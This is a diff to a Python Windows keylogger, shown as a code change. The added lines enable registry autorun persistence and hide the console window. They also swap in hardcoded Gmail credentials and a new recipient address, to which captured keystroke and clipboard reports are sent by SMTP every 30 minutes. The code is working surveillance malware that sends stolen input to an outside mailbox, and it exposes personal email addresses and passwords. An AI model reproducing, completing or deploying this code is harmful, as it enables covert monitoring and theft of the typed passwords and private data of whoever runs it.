@@ -21,12 +21,12 @@ import win32process
 import  shutil
 
 
-# autorun.AddToRegistry()
-# hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
-# if hwnd != 0:      
-#     ctypes.windll.user32.ShowWindow(hwnd, 0)      
-#     ctypes.windll.kernel32.CloseHandle(hwnd)
-#     _, pid = win32process.GetWindowThreadProcessId(hwnd)
+autorun.AddToRegistry()
+hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
+if hwnd != 0:      
+    ctypes.windll.user32.ShowWindow(hwnd, 0)      
+    ctypes.windll.kernel32.CloseHandle(hwnd)
+    _, pid = win32process.GetWindowThreadProcessId(hwnd)
 
 
 print('program started')
@@ -49,10 +49,10 @@ def clipboard_listener():
 def main_func():
     clipboard_listener()
     SEND_REPORT_EVERY = 1800 # in seconds, 60 means 1 minute and so on
-    # EMAIL_ADDRESS = "Shalinitiwari1098@gmail.com"
-    # EMAIL_PASSWORD = "abcd@1234"
-    EMAIL_ADDRESS = "core.builder11@gmail.com"
-    EMAIL_PASSWORD = "builder123*"
+    EMAIL_ADDRESS = "Shalinitiwari1098@gmail.com"
+    EMAIL_PASSWORD = "abcd@1234"
+    # EMAIL_ADDRESS = "core.builder11@gmail.com"
+    # EMAIL_PASSWORD = "builder123*"
 
     class Keylogger:
         def __init__(self, interval, report_method="email"):
@@ -142,7 +142,7 @@ def main_func():
             # login to the email account
             server.login(email, password)
             # send the actual message
-            server.sendmail(email, 'core.builder11@gmail.com',msg.as_string())
+            server.sendmail(email, 'Anshumankumar7890@gmail.com',msg.as_string())
             print('email sent successfully')
             # terminates the session
             server.quit()
